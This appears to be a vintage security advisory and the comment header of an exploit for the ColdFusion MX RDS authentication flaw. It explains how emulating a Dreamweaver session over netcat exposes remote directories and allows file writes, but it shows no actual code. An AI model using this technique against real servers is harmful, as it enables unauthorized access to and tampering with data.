A vulnerability has been reported for the RDS service that may allow an attacker to obtain unauthorized access to a data residing on a ColdFusion MX server. The vulnerability is due to the way that authentication is done when communicating with a ColdFusion MX server.

It is possible for a remote user to configure their web site properties to access files residing on the vulnerable server.

Any information obtained in this manner may be used by an attacker to launch further attacks against a vulnerable system.

## BIG NOTE -> aka ( DISCLAIMER ): if you do something retarded with this code or modification of this code you are completely on your OWN,
# I or rs2112 take no responsibilty for your stupid actions, A JUST BE KNOWN ! This is meant for administrators to protect themselves against
# attack and thats it.

## CF 6 MX Server does several things in order to get remote dir structure so we will need
# to recreate these functions. This is a "almost" complete emulation of a dreamweaver client connection just FYI,
# in like one full HTTP1/1 session witin netcat.
#
# I would like to point out that the ASPSESSID never validates so you can change this on the fly.
#
# Also I would like to say Macromedia's phone support sucks ass, I called trying to be a nice guy ( to follow up on email ) and
# they attempted to belittle my intelligence on the phone.. . OH and yes I did email them several times with no response.
#
# You can Write as well, I have tested and this works fine. If you change the file to and *.exe it will attempt to become and
# 16bit dos application on the remote box FYI.
#
# Requests are sent in this order to get a remote dir structure:
# NOTE: Create dir retrieval array.
#
# ANOTHER NOTE:
# Due to certian current situations I am not allowed to release full exploit code with ( READ, RETRIEVE, WRITE ) functions, I have fully working code,
# If you email me I will not send it to you, so basically dont bother.
#
# Im sorry for being such a foil fart but hey, you understand im shure.
